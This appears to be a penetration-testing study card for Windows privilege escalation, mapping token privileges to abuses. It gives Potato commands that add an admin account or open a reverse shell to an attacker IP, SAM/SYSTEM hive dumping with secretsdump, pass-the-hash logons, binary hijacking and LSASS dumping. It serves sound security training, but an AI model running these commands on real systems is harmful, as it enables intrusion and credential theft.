A dangerous entry in `whoami /priv` (or a privileged group) is a token you can cash in - turn it into the safest justified path to SYSTEM. Token privileges have no Linux equivalent.

## Goal
Convert an assigned privilege or group into SYSTEM (or local admin) using the lowest-risk technique whose prerequisites you can actually confirm.

## Tips
Presence beats state: if a privilege is **listed** in `whoami /priv`, it is assigned to you even when shown `Disabled`. `Disabled` only means it is not active in the current process - a technique enables it when needed. But "listed" does **not** guarantee the technique's *other* prerequisites (service, OS build, session, runtime, architecture) are met, so check those too. [Priv2Admin](https://github.com/gtworek/Priv2Admin) maps any privilege name to its abuse.

Checklist:
- [ ] `whoami /priv` - `SeImpersonate` / `SeAssignPrimaryToken` listed? → Potato (Case 1)
- [ ] `SeBackup` or **Backup Operators**? → dump SAM + SYSTEM (Case 2)
- [ ] `SeRestore` / `SeTakeOwnership`? → write / own a SYSTEM-run object (Case 3)
- [ ] `SeDebug`? → dump LSASS memory (Case 4)
- [ ] confirmed the technique's *other* prerequisites (build / session / arch)?

## Privilege lookup

| Privilege / group | Grants | Route |
|---|---|---|
| **SeImpersonatePrivilege** | impersonate a token you can coerce | Potato → SYSTEM (Case 1) |
| **SeAssignPrimaryTokenPrivilege** | assign a primary token to a new process | Potato family (Case 1) |
| **SeBackupPrivilege** / **Backup Operators** | read any file, ACL ignored | dump SAM + SYSTEM (Case 2) |
| **SeRestorePrivilege** | write any file, ACL ignored | overwrite a SYSTEM-run binary / DLL / key (Case 3) |
| **SeTakeOwnershipPrivilege** | take ownership (`WRITE_OWNER`) | own an object → rewrite its ACL → as SeRestore (Case 3) |
| **SeDebugPrivilege** | read any process memory | dump LSASS → creds (Case 4) |
| **SeLoadDriverPrivilege** | load a driver | load a vulnerable signed driver - rare, high-complexity (Case 5) |

Ignore the ubiquitous ones (`SeChangeNotify`, `SeIncreaseWorkingSet`, `SeShutdown`, `SeUndock`, `SeTimeZone`) - every user holds them.

### SeBackup context gate

| Host context | What SeBackup / Backup Operators can yield | Route |
| --- | --- | --- |
| Member server or workstation | local SAM/SYSTEM and other readable host backups | Case 2 below, then [[03_credential_access#Local SAM + SYSTEM (one host's local accounts)\|local SAM + SYSTEM]] |
| Domain controller | local hives plus, when VSS is usable, offline `NTDS.dit` and SYSTEM | [[03_credential_access#NTDS.dit: offline NTDS via SeBackup / Backup Operators on a DC\|offline NTDS via SeBackup]] |

Host role changes the available source. SeBackup on a member host does not yield domain hashes.

# Commands

### Step 1: read your privileges and groups
```batch
whoami /priv
whoami /groups
```

### Step 2: match a privilege to its abuse
```text
Look up the exact privilege name in Priv2Admin, then pick the lowest-step technique
whose prerequisites you can confirm. SeImpersonate is the highest-value common one.
```

## Exploit

### Case 1: SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
**Trigger / preconditions:** `SeImpersonatePrivilege` listed - service accounts (IIS AppPool, `LOCAL SERVICE`, `NETWORK SERVICE`, MSSQL) usually have it. You *also* need a technique-compatible OS build, session type, .NET/runtime, and matching architecture. A service account is a **candidate**, not an automatic SYSTEM.

**Abuse - course-aligned example (SigmaPotato):**
```powershell
# transfer the tool first: see [[01_orientation#File transfer - Kali to Windows|file transfer]]
.\SigmaPotato.exe "net user <NEWADMIN> <PASS> /add"
.\SigmaPotato.exe "net localgroup Administrators <NEWADMIN> /add"
.\SigmaPotato.exe --revshell <KALI_IP> <PORT>     # interactive shell alternative
```
**Other Potato options - version-dependent, pick by build:**
```text
PrintSpoofer  - SeImpersonate via Print Spooler / named pipes (itm4n)
GodPotato     - Potato-family, its own .NET / OS support matrix
JuicyPotato / RoguePotato - older variants, CLSID / redirector dependent; use only when
                            the modern tools do not fit the target build
```
Links: [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) (current PEN-200 example) · [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) (archived project) · [GodPotato](https://github.com/BeichenDream/GodPotato).

**Empty `/priv` on a service account** (privileges stripped): restore the default set with [FullPowers](https://github.com/itm4n/FullPowers), then run a Potato. FullPowers **restores a stripped default privilege set** - it is *not* a way to enable a privilege already shown `Disabled`, and not a generic token fixer.

**Verify:**
```powershell
whoami                                  # in the new process -> nt authority\system
net localgroup Administrators           # <NEWADMIN> present?
```
**Dead end / pivot:** privilege listed but the tool fails across build variants → try another Potato matched to the OS build/arch; if none fit, move to [[03_services]] or [[05_stored_credentials]]. Never assume one specific Potato works on every modern build.

### Case 2: SeBackup / Backup Operators → local hives or DC VSS
**Trigger / preconditions:** `SeBackupPrivilege` listed, or membership of **Backup Operators**. Grants read of any file regardless of ACL.

**Why SAM + SYSTEM:** SAM stores local-account password-hash material; the SYSTEM hive supplies the boot key needed to decrypt it - you need **both**. This pair is analogous in *purpose*, not format, to Linux `/etc/shadow` and its key.

**Abuse on a member server or workstation:**
```batch
reg save HKLM\SAM    %TEMP%\SAM.hive
reg save HKLM\SYSTEM %TEMP%\SYSTEM.hive
:: live SAM is locked; Backup Operators can also copy it via robocopy /b or the Backup API
```
```bash
# on Kali, from the copied hives (transfer them back first):
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```
**Verify / next:** you now hold the local Administrator NTLM hash. Use it (pass-the-hash) over an available service - see logon paths in [[05_stored_credentials]]:
```bash
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>       # if WinRM is reachable
impacket-psexec -hashes :<NTLM_HASH> Administrator@<TARGET>
```
**Dead end / pivot:** recovering a hash does **not** prove remote authentication will be permitted or that a service is reachable. If PtH is blocked, try another logon path or crack the hash offline as a fallback.

**On a domain controller:** do not stop at the local SAM or label it a domain dump. Use [[03_credential_access#NTDS.dit: offline NTDS via SeBackup / Backup Operators on a DC|the VSS/DiskShadow NTDS workflow]] only after proving DC role, usable backup context, staging space, and cleanup.

> **Domain context:** on a domain-joined host, local admin/SYSTEM is a *credential-harvest* opportunity, not domain privilege. Choose the right source (local SAM vs LSA vs LSASS vs NTDS vs DCSync) in [[03_credential_access]], then reuse via [[00_AD_METHODOLOGY]].

### Case 3: SeRestore / SeTakeOwnership → write a privileged object
**Trigger / preconditions:** `SeRestorePrivilege` (write any file, ACL ignored) or `SeTakeOwnershipPrivilege` (seize ownership, then grant yourself write).

**Abuse - pick a SYSTEM-run target you can trigger, and back it up first:**
```text
SeRestore:       overwrite a binary/DLL a SYSTEM service runs, or its ImagePath -> restart -> SYSTEM
SeTakeOwnership: takeown /f <TARGET> ; icacls <TARGET> /grant <you>:F  -> then treat as SeRestore
```
State-changing: record the original object, restore it after you verify, and use the restart/trigger discipline in [[03_services]].
**Verify:** trigger the consumer, then `whoami` in the resulting process.
**Dead end / pivot:** no SYSTEM consumer you can trigger → this privilege is inert here; move on.

### Case 4: SeDebug → dump LSASS
**Trigger:** `SeDebugPrivilege` listed (read any process memory).
**Abuse:** dump `lsass.exe` and parse it **off-host** for credentials. Prefer dump-then-parse over running full tooling on the target.
**Dead end / pivot:** LSASS protected (PPL / Credential Guard) → dumping fails; pivot to another vector.

### Case 5: SeLoadDriver (rare, advanced)
Load a known-vulnerable signed driver to reach kernel code execution. Multi-step, fragile, and easy to crash the box - treat as depth, not a default exam path. Look up the exact steps in [Priv2Admin](https://github.com/gtworek/Priv2Admin) if you must use it.

## Helpline:
1. Disabled vs assigned
```
whoami /priv State column = Enabled | Disabled
  listed at all = assigned to you (abusable)
  Disabled      = just not active in THIS process; the technique enables it
  NOT listed    = you do not have it
"assigned" != "every prerequisite met" - still check build / session / runtime / arch.
```

2. Not privilege enablers
```
PowerUp    = enumeration / helper framework (finds misconfigs) - NOT a privilege enabler
FullPowers = restores a STRIPPED default privilege set for LOCAL/NETWORK SERVICE
             (not the same as toggling a privilege already shown Disabled)
```

3. Deeper reference
```
Priv2Admin           - privilege name -> abuse map (beside the lookup table above)
PayloadsAllTheThings - deeper technique / troubleshooting when a card is not enough
```
[PayloadsAllTheThings / InternalAllTheThings - Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/) - deeper technique / payload reference (the author moved this content from PayloadsAllTheThings to InternalAllTheThings).
